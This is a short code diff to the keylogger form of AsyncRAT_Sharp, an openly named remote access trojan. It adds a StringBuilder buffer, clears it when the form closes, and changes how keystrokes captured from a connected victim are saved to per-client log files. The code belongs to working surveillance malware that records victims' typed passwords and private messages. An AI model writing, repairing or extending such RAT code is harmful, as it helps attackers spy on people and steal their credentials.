@@ -23,6 +23,8 @@ namespace AsyncRAT_Sharp.Forms
 
         public Form1 F { get; set; }
         internal Clients C { get; set; }
+        public StringBuilder SB = new StringBuilder();
+
         private void Timer1_Tick(object sender, EventArgs e)
         {
             if (!C.ClientSocket.Connected) this.Close();
@@ -30,6 +32,7 @@ namespace AsyncRAT_Sharp.Forms
 
         private void Keylogger_FormClosed(object sender, FormClosedEventArgs e)
         {
+            SB?.Clear();
             MsgPack msgpack = new MsgPack();
             msgpack.ForcePathObject("Packet").AsString = "keyLogger";
             msgpack.ForcePathObject("isON").AsString = "false";
@@ -67,7 +70,7 @@ namespace AsyncRAT_Sharp.Forms
                 string fullPath = Path.Combine(Application.StartupPath, "ClientsFolder\\" + C.ID + "\\Keylogger");
                 if (!Directory.Exists(fullPath))
                     Directory.CreateDirectory(fullPath);
-                File.WriteAllText(fullPath + $"\\Keylogger_{DateTime.Now.ToString("MM-dd-yyyy HH;mm;ss")}.txt", richTextBox1.Text);
+                File.WriteAllText(fullPath + $"\\Keylogger_{DateTime.Now.ToString("MM-dd-yyyy HH;mm;ss")}.txt", richTextBox1.Text.Replace("\n", Environment.NewLine));
             }
             catch { }
         }
